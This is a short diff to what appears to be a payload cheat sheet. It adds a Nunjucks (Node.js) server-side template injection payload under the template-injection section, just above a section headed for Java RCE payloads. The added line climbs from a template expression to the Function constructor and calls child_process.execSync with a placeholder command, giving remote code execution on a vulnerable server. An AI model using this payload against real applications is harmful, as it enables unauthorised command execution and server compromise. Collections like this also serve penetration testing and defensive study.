@@ -53,6 +53,12 @@ Content-Type: application/json
 
 # Server-Side Template Injection
 
+## Nunjucks (NodeJS)
+
+```
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('payload')")()}}
+```
+
 ## Java
 
 RCE Payload 1
